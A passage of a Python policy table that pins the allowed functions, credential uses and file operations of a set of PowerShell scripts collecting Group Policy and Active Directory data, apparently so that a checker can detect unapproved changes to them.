# module auto-loading, and the engine object itself.
FORBIDDEN_VARIABLE_REFS = frozenset(
    {"psdefaultparametervalues", "psmoduleautoloadingpreference", "executioncontext"}
)
# The only automatic/preference variable bindings the collectors make.
SPECIAL_BINDINGS: dict[str, frozenset[tuple[str, str]]] = {
    "Export-GpoEstate.ps1": frozenset({("erroractionpreference", "= 'Stop'")}),
    "Export-GroupMembers.ps1": frozenset({("erroractionpreference", "= 'Stop'")}),
    "Export-Principals.ps1": frozenset(
        {
            ("erroractionpreference", "= 'Stop'"),
            ("matches", "= [regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+')"),
            ("matches", "= [regex]::Matches($sddl, 'S-1-[0-9]+-[0-9-]+')"),
        }
    ),
    "Run-GpoLensCollection.ps1": frozenset({("erroractionpreference", "= 'Stop'")}),
    "GpoLensCollectionMarker.ps1": frozenset(),
    "Register-GpoLensCollection.ps1": frozenset({("erroractionpreference", "= 'Stop'")}),
}
# A variable may be the root of an index write (`$h[$k] = ...`) only here.
INDEX_ASSIGNMENT_ROOTS: dict[str, frozenset[str]] = {
    "Export-GpoEstate.ps1": frozenset({"principals", "groupmembers"}),
    "Export-GroupMembers.ps1": frozenset({"groupmembers"}),
    "Export-Principals.ps1": frozenset({"principals"}),
    "Run-GpoLensCollection.ps1": frozenset({"previous"}),
    "GpoLensCollectionMarker.ps1": frozenset(),
    "Register-GpoLensCollection.ps1": frozenset(),
}
# The only targets of variable-writing common parameters (literal names).
COMMON_PARAM_TARGETS: dict[str, frozenset[str]] = {
    "Export-GpoEstate.ps1": frozenset({"zipenumerr", "srcerr"}),
    "Export-GroupMembers.ps1": frozenset(),
    "Export-Principals.ps1": frozenset(),
    "Run-GpoLensCollection.ps1": frozenset(),
    "GpoLensCollectionMarker.ps1": frozenset(),
    "Register-GpoLensCollection.ps1": frozenset(),
}
# Exact set of functions each script defines. A redefinition (`function
# Assert-GpoLensRegularTree {}` later in the file) or a function shadowing an
# allowlisted cmdlet (`function Get-Item { ... }`) is not in the set.
LOCAL_FUNCTIONS: dict[str, tuple[str, ...]] = {
    "Export-GpoEstate.ps1": ("New-GpoExportZip", "Set-SectionProgress"),
    "Export-GroupMembers.ps1": (),
    "Export-Principals.ps1": (),
    "Run-GpoLensCollection.ps1": (
        "Write-GpoLensCollectionLog",
        "Get-GpoLensCompletedExports",
        "Assert-GpoLensRegularTree",
        "Assert-GpoLensCollectionOwner",
        "Invoke-GpoLensCollection",
    ),
    "GpoLensCollectionMarker.ps1": (
        "Read-GpoLensOwnerMarkerBytes",
        "Write-GpoLensOwnerMarkerBytes",
    ),
    "Register-GpoLensCollection.ps1": (
        "ConvertTo-GpoLensTaskArgument",
        "ConvertTo-GpoLensAbsolutePath",
        "Set-GpoLensCollectionOwner",
    ),
}
# SHA-256 of each local function's normalized syntax tree (the same row format
# as the golden, rooted at the FunctionDefinitionAst). HAND-MAINTAINED: the
# generator never writes this table (test_generator_never_writes_policy). Keys
# are function names; check_local_function_bodies compares casefolded.
LOCAL_FUNCTION_BODIES: dict[str, dict[str, str]] = {
    "Export-GpoEstate.ps1": {
        "New-GpoExportZip": ("aacc73f36d374f73a77e565caf6883eb5c1e244669f3fa8d545e944be8315c25"),
        "Set-SectionProgress": ("452134c5d14fa82771a8f7e1cd085b3621ee16dc33457432f1f5b5db3ad82cc6"),
    },
    "Export-GroupMembers.ps1": {},
    "Export-Principals.ps1": {},
    "Run-GpoLensCollection.ps1": {
        "Write-GpoLensCollectionLog": (
            "c063dec4d809ec58838c2f60022832f4e8bf67aaf839b70f54cba37b8214a36d"
        ),
        "Get-GpoLensCompletedExports": (
            "884c8f50670f56a5c6e432421ebd433981523bacbd5a0dea001c33d96f7f14cb"
        ),
        "Assert-GpoLensRegularTree": (
            "641bc5815235b9475ec326e3993752ac02a926fef931b616c15c68d99f802858"
        ),
        "Assert-GpoLensCollectionOwner": (
            "a9defc5b87009a3010dee3e57aecac76369ec4644c1cbae2472b236b9c981f7d"
        ),
        "Invoke-GpoLensCollection": (
            "3224d100fd66dae939805becde789ce6e7b51028adacdddd9163aa63cf1c3221"
        ),
    },
    "GpoLensCollectionMarker.ps1": {
        "Read-GpoLensOwnerMarkerBytes": (
            "fc4ea3b3baa91934c20ca92086e70949ef98073640aafd382a20a6437382b4e1"
        ),
        "Write-GpoLensOwnerMarkerBytes": (
            "85bacfbf2e5a9538af9b3ecbc60dbdcdfe8da9cef00a5b9a885e6dd0d3ccc9ca"
        ),
    },
    "Register-GpoLensCollection.ps1": {
        "ConvertTo-GpoLensTaskArgument": (
            "b21ec1b0406abf8920ffa137650660617e27a873b106c83e32db99e84df08699"
        ),
        "ConvertTo-GpoLensAbsolutePath": (
            "3167a68a6db407a4a1af18d6df9046eab0e70cb61a50e2950c93044b3b815ea0"
        ),
        "Set-GpoLensCollectionOwner": (
            "afb35b5aa433fc5611ac9dd1a2c1cb4ca4cd567b099ae0bdd4f6cc767bd4bb35"
        ),
    },
}

# Exact uses of secret-bearing variables (see check_secret_uses): (variable,
# enclosing function, normalized statement). HAND-MAINTAINED.
SECRET_USES: dict[str, tuple[tuple[str, str, str], ...]] = {
    "Export-GpoEstate.ps1": (),
    "Export-GroupMembers.ps1": (
        ("credential", "", "[System.Management.Automation.PSCredential]$Credential"),
        ("adparams", "", "$adParams = @{}"),
        ("credential", "", "$Credential"),
        ("adparams", "", "$adParams.Credential = $Credential"),
        ("credential", "", "$adParams.Credential = $Credential"),
        ("adparams", "", "Get-ADGroupMember -Identity $sid -Recursive @adParams -ErrorAction Stop"),
    ),
    "Export-Principals.ps1": (
        ("credential", "", "[System.Management.Automation.PSCredential]$Credential"),
        ("adparams", "", "$adParams = @{}"),
        ("credential", "", "$Credential"),
        ("adparams", "", "$adParams.Credential = $Credential"),
        ("credential", "", "$adParams.Credential = $Credential"),
        ("adparams", "", "Get-ADDomain @adParams"),
        (
            "adparams",
            "",
            (
                "Get-ADObject -SearchBase $policiesDN -LDAPFilter "
                '"(objectClass=groupPolicyContainer)" -Properties '
                "nTSecurityDescriptor, displayName @adParams"
            ),
        ),
        ("adparams", "", "$adParams = @{}"),
        ("credential", "", "$Credential"),
        ("adparams", "", "$adParams.Credential = $Credential"),
        ("credential", "", "$adParams.Credential = $Credential"),
        ("adparams", "", "Get-ADDomain @adParams"),
        (
            "adparams",
            "",
            (
                "Get-ADObject -Filter \"objectSid -eq '$sid'\" -Properties "
                "objectClass, sAMAccountName, name @adParams -ErrorAction Stop"
            ),
        ),
    ),
    "Run-GpoLensCollection.ps1": (),
    "GpoLensCollectionMarker.ps1": (),
    "Register-GpoLensCollection.ps1": (
        ("credential", "", "[Parameter(ParameterSetName = 'Service')] [pscredential]$Credential"),
        ("credential", "", "-not $Credential"),
        (
            "credential",
            "",
            (
                "$Credential = Get-Credential -UserName $ServiceAccount -Message "
                "'Collection task credentials (saved only by Windows Task "
                "Scheduler)'"
            ),
        ),
        ("credential", "", "-not $Credential -or $Credential.UserName -ne $ServiceAccount"),
        ("credential", "", "-not $Credential -or $Credential.UserName -ne $ServiceAccount"),
        ("taskpassword", "", "$taskPassword = $Credential.GetNetworkCredential().Password"),
        ("credential", "", "$taskPassword = $Credential.GetNetworkCredential().Password"),
        (
            "taskpassword",
            "",
            (
                "Register-ScheduledTask -TaskName $TaskName -InputObject $task "
                "-User $ServiceAccount -Password $taskPassword -Force"
            ),
        ),
        ("taskpassword", "", "$taskPassword = $null"),
        ("credential", "", "$Credential = $null"),
    ),
}

# SHA-256 of each script's attributes + param block rows. HAND-MAINTAINED.
SCRIPT_HEADERS: dict[str, str] = {
    "Export-GpoEstate.ps1": ("6dbe34329001a4e2fe1c85e31716c69c9253ba4cbda2b9f10d8ed297910ffdb7"),
    "Export-GroupMembers.ps1": ("49a4d9070b03f9ca32a4e281eb1a8ae4b106eda3ae7e94573b508dc50c6c30e5"),
    "Export-Principals.ps1": ("dfa22517b497f3eeafb9a18678ff7495e2bcd72c74bce468b6beb89862d6efd4"),
    "Run-GpoLensCollection.ps1": (
        "874b6828b646e8479ce7408283e78169b4c84b4f8c03d9445ed230d941bbe733"
    ),
    "GpoLensCollectionMarker.ps1": (
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    ),
    "Register-GpoLensCollection.ps1": (
        "98c57e75887fbdc508701b1c27836d9a5566b4d7fd0842b689650eb66a6a5036"
    ),
}

# Pinned write/exec operations with their control-flow context (see
# check_guarded_ops). Each entry is (normalized operation text, context from
# outermost to innermost).
GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
    "Export-GpoEstate.ps1": (
        (
            "Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop",
            ("function New-GpoExportZip",),
        ),
        (
            "Test-Path -LiteralPath $archive",
            (
                "function New-GpoExportZip",
                "try",
                "if-condition after []",
            ),
        ),
        (
            "Remove-Item -LiteralPath $archive -Force -ErrorAction Stop",
            (
                "function New-GpoExportZip",
                "try",
                "if (Test-Path -LiteralPath $archive) after []",
            ),
        ),
        (
            (
                "Get-ChildItem -LiteralPath $ExportPath -Recurse -File ` -ErrorAction "
                "SilentlyContinue -ErrorVariable +zipEnumErr"
            ),
            (
                "function New-GpoExportZip",
                "try",
            ),
        ),
        (
            'Write-Host "Done: $archive ($($diskFiles.Count) files)"',
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
            ),
        ),
        (
            "Test-Path -LiteralPath $archive",
            (
                "function New-GpoExportZip",
                "catch []",
                "if-condition after []",
            ),
        ),
        (
            "Remove-Item -LiteralPath $archive -Force -ErrorAction Stop",
            (
                "function New-GpoExportZip",
                "catch []",
                "if (Test-Path -LiteralPath $archive) after []",
            ),
        ),
        (
            "Get-Module -ListAvailable -Name $mod",
            (
                "foreach ($mod in @('GroupPolicy','ActiveDirectory'))",
                "if-condition after []",
            ),
        ),
        (
            "Write-Error \"Required module '$mod' is not available. Install RSAT.\"",
            (
                "foreach ($mod in @('GroupPolicy','ActiveDirectory'))",
                "if (-not (Get-Module -ListAvailable -Name $mod)) after []",
            ),
        ),
        (
            "Test-Path -LiteralPath $OutputRoot",
            (
                "try",
                "if-condition after []",
            ),
        ),
        (
            "New-Item -ItemType Directory -Force -Path $OutputRoot",
            (
                "try",
                "if (-not (Test-Path -LiteralPath $OutputRoot)) after []",
            ),
        ),
        (
            "Out-Null",
            (
                "try",
                "if (-not (Test-Path -LiteralPath $OutputRoot)) after []",
            ),
        ),
        (
            'Join-Path $OutputRoot "_writetest_.tmp"',
            ("try",),
        ),
        (
            "Remove-Item $testFile -Force",
            ("try",),
        ),
        (
            "Write-Error \"OutputRoot '$OutputRoot' is not writable: $($_.Exception.Message)\"",
            ("catch []",),
        ),
        (
            "Get-ADDomain",
            (),
        ),
        (
            'Get-Date -Format "yyyyMMdd-HHmmss"',
            (),
        ),
        (
            'Join-Path $OutputRoot "$($dom.DNSRoot)-$stamp"',
            (),
        ),
        (
            "Get-GPO -All",
            (),
        ),
        (
            "Get-ADOrganizationalUnit -Filter *",
            (),
        ),
        (
            (
                "Get-ADObject -Filter \"objectClass -eq 'msWMI-Som'\" -Properties "
                "'msWMI-Name' -ErrorAction SilentlyContinue"
            ),
            (),
        ),
        (
            (
                "Get-ADObject -SearchBase "
                '"CN=Sites,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter '
                '"(objectClass=site)" -ErrorAction SilentlyContinue'
            ),
            (),
        ),
        (
            "Get-ADRootDSE",
            (),
        ),
        (
            "Get-ChildItem $src -Recurse -File -ErrorAction SilentlyContinue",
            (
                "if ($DryRun) after []",
                "if (-not $SkipSysvol) after []",
            ),
        ),
        (
            "Measure-Object -Property Length -Sum",
            (
                "if ($DryRun) after []",
                "if (-not $SkipSysvol) after []",
            ),
        ),
        (
            'Write-Host "DryRun: would export the following:"',
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " Domain: $($dom.DNSRoot)"',
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " GPOs: $gpoCount"',
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " OUs: $ouCount"',
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " WMI filters: $wmiCount"',
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " AD sites: $siteCount"',
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " Output dir: $out"',
            ("if ($DryRun) after []",),
        ),
        (
            "Write-Host \" SYSVOL: $(if ($SkipSysvol) {'skipped'} else {$sysvolSizeStr})\"",
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " Zip: $(if ($NoZip) {\'skipped\'} else {"$out.zip"})"',
            ("if ($DryRun) after []",),
        ),
        (
            "New-Item -ItemType Directory -Force -Path (Join-Path $out 'reports')",
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Join-Path $out 'reports'",
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Out-Null",
            ("guard if ($DryRun) -> return",),
        ),
        (
            'Write-Host "Exporting $($dom.DNSRoot) -> $out"',
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Write-Progress -Activity $Activity -PercentComplete $pct",
            (
                "guard if ($DryRun) -> return",
                "function Set-SectionProgress",
            ),
        ),
        (
            'Set-SectionProgress -Activity "GPO settings (XML reports)" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            (
                "Get-GPOReport -All -ReportType Xml -Path (Join-Path $out 'AllGPOs.xml') "
                "-ErrorAction Stop"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'AllGPOs.xml'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Warning "Combined GPO report failed: $($_.Exception.Message)"',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            (
                'Write-Progress -Activity "GPO settings (XML reports)" ` -Status "$i / '
                '$gpoCount" -PercentComplete ([math]::Round(($sectionNum - 1 + ($i / '
                "$gpoCount)) / $totalSections * 100))"
            ),
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
            ),
        ),
        (
            (
                "Get-GPOReport -Guid $gpo.Id -ReportType Xml ` -Path (Join-Path $out "
                '"reports\\${safe}__$($gpo.Id).xml") -ErrorAction Stop'
            ),
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "try",
            ),
        ),
        (
            'Join-Path $out "reports\\${safe}__$($gpo.Id).xml"',
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "try",
            ),
        ),
        (
            (
                "Write-Warning \"GPO report failed for '$($gpo.DisplayName)' ($($gpo.Id)): "
                '$($_.Exception.Message)"'
            ),
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "catch []",
            ),
        ),
        (
            (
                "Get-ADObject -SearchBase $policiesDN -LDAPFilter "
                '"(objectClass=groupPolicyContainer)" ` -Properties displayName -ErrorAction '
                "Stop"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            (
                "ForEach-Object { [pscustomobject]@{ Id = $_.Name.Trim('{}'); DisplayName = "
                "$_.displayName } }"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'gpo-inventory.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'gpo-inventory.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            (
                'Write-Warning "Inaccessible GPO detected: $guid$(if ($gpc.displayName) { " '
                '($($gpc.displayName))" })"'
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gpc in $allGpc)",
                "if (-not $knownIds.Contains($guid)) after []",
            ),
        ),
        (
            'Write-Warning "GPC completeness cross-check failed: $($_.Exception.Message)"',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'collection-errors.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "if ($collectionErrors.Count -eq 0) after []",
            ),
        ),
        (
            "Join-Path $out 'collection-errors.json'",
            (
                "guard if ($DryRun) -> return",
                "if ($collectionErrors.Count -eq 0) after []",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "else of [($collectionErrors.Count -eq 0)]",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'collection-errors.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "else of [($collectionErrors.Count -eq 0)]",
            ),
        ),
        (
            "Join-Path $out 'collection-errors.json'",
            (
                "guard if ($DryRun) -> return",
                "else of [($collectionErrors.Count -eq 0)]",
            ),
        ),
        (
            'Set-SectionProgress -Activity "GPO metadata" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            (
                "Select-Object DisplayName, Id, GpoStatus, CreationTime, ModificationTime, "
                "@{n='UserDSVersion';e={$_.User.DSVersion}}, "
                "@{n='UserSysvolVersion';e={$_.User.SysvolVersion}}, "
                "@{n='ComputerDSVersion';e={$_.Computer.DSVersion}}, "
                "@{n='ComputerSysvolVersion';e={$_.Computer.SysvolVersion}}, "
                "@{n='WmiFilter';e={$_.WmiFilter.Name}}"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'gpo-metadata.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'gpo-metadata.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Set-SectionProgress -Activity "Inheritance (gp-inheritance)" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Get-ADOrganizationalUnit -Filter *",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Select-Object -Expand DistinguishedName",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Get-GPInheritance -Target $t",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($t in $targets)",
                "try",
            ),
        ),
        (
            "Select-Object DisplayName, GpoId, Enabled, Enforced, Order, Target",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($t in $targets)",
                "try",
            ),
        ),
        (
            'Write-Warning "GPInheritance failed for $t : $($_.Exception.Message)"',
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($t in $targets)",
                "catch []",
            ),
        ),
        (
            "ConvertTo-Json -Depth 6",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'gp-inheritance.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'gp-inheritance.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Set-SectionProgress -Activity "OU tree" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Get-ADOrganizationalUnit -Filter * -Properties gPLink, gPOptions",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Select-Object DistinguishedName, Name, gPLink, gPOptions",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'ou-tree.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'ou-tree.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Set-SectionProgress -Activity "AD sites" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Get-ADRootDSE",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            (
                'Get-ADObject -SearchBase "CN=Sites,$configNC" -LDAPFilter '
                '"(objectClass=site)" ` -Properties gPLink, gPOptions, name'
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Select-Object DistinguishedName, Name, gPLink, gPOptions",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'sites.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'sites.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Set-SectionProgress -Activity "WMI filters" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            (
                "Get-ADObject -Filter \"objectClass -eq 'msWMI-Som'\" -Properties "
                "'msWMI-Name', 'msWMI-Parm2'"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Select-Object @{n='Name';e={$_.'msWMI-Name'}}, @{n='Query';e={$_.'msWMI-Parm2'}}",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'wmi-filters.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'wmi-filters.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Set-SectionProgress -Activity "Principals (SID -> name)" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            (
                "Get-ChildItem -LiteralPath (Join-Path $out 'reports') -Filter '*.xml' "
                "-ErrorAction SilentlyContinue"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'reports'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'AllGPOs.xml'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Test-Path -LiteralPath $allXmlPath",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if-condition after []",
            ),
        ),
        (
            "Get-Item -LiteralPath $allXmlPath",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if (Test-Path -LiteralPath $allXmlPath) after []",
            ),
        ),
        (
            "Get-Content -LiteralPath $f.FullName -Raw -ErrorAction Stop",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($f in $xmlFiles)",
                "try",
            ),
        ),
        (
            "Join-Path $out 'gpo-metadata.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Test-Path -LiteralPath $metaPath",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if-condition after []",
            ),
        ),
        (
            "Get-Content -LiteralPath $metaPath -Raw",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if (Test-Path -LiteralPath $metaPath) after []",
                "try",
            ),
        ),
        (
            'Write-Host " Found $($allSids.Count) unique SIDs to resolve"',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Sort-Object",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($sid in ($allSids | Sort-Object))",
            ),
        ),
        (
            "New-Object System.Security.Principal.SecurityIdentifier($sid)",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($sid in ($allSids | Sort-Object))",
                "try",
            ),
        ),
        (
            "Where-Object { $_ -match '^S-1-5-21-' -and $principals[$_].type -eq 'Unresolved' }",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Host " Resolving $($domainSids.Count) domain SIDs via Get-ADObject..."',
            (
                "guard if ($DryRun) -> return",
                "try",
                "if ($domainSids.Count -gt 0) after []",
            ),
        ),
        (
            (
                "Get-ADObject -Filter \"objectSid -eq '$sid'\" -Properties objectClass, "
                "sAMAccountName, name -ErrorAction Stop"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                "try",
            ),
        ),
        (
            "Get-Date -Format 'o'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 5",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'principals.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'principals.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Host " Resolved: $resolved, Unresolved: $unresolved"',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Warning "Principals collection failed: $($_.Exception.Message)"',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            'Set-SectionProgress -Activity "Group membership" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Where-Object { $principals[$_].type -eq 'Group' }",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Host " Expanding $($groupSids.Count) groups..."',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Get-ADGroupMember -Identity $gSid -Recursive -ErrorAction Stop",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gSid in $groupSids)",
                "try",
            ),
        ),
        (
            "ForEach-Object { $_.SID.Value }",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gSid in $groupSids)",
                "try",
            ),
        ),
        (
            "Get-Date -Format 'o'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 5",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'group-members.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'group-members.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Host " Expanded: $groupsExpanded, Failed: $groupsFailed"',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Warning "Group membership collection failed: $($_.Exception.Message)"',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            'Set-SectionProgress -Activity "SYSVOL copy" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Join-Path $out 'SYSVOL-Policies'",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            "New-Item -ItemType Directory -Force -Path $dest",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            "Out-Null",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            (
                "Get-ChildItem -LiteralPath $src -Directory ` -ErrorAction SilentlyContinue "
                "-ErrorVariable +srcErr"
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            (
                "Copy-Item -LiteralPath $pf.FullName -Destination $dest -Recurse -Force "
                "-ErrorAction Stop"
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "foreach ($pf in $policyFolders)",
                "try",
            ),
        ),
        (
            (
                'Write-Warning "SYSVOL copy failed for policy folder $($pf.Name): '
                '$($_.Exception.Message)"'
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "foreach ($pf in $policyFolders)",
                "catch []",
            ),
        ),
        (
            "Get-ChildItem -LiteralPath $src -File -ErrorAction SilentlyContinue",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            (
                "ForEach-Object { Copy-Item -LiteralPath $_.FullName -Destination $dest -Force "
                "-ErrorAction SilentlyContinue }"
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            (
                "Copy-Item -LiteralPath $_.FullName -Destination $dest -Force -ErrorAction "
                "SilentlyContinue"
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "scriptblock positional of ForEach-Object",
            ),
        ),
        (
            "Get-ChildItem -LiteralPath $dest -Recurse -File -ErrorAction SilentlyContinue",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'collection-errors.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
            ),
        ),
        (
            "Join-Path $out 'collection-errors.json'",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
            ),
        ),
        (
            'Write-Warning "SYSVOL copy produced no files: $detail"',
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                (
                    "else of [($policyFolders.Count -eq 0 -or $copiedCount -eq 0) ; "
                    "($sysvolErrors -eq 0)]"
                ),
            ),
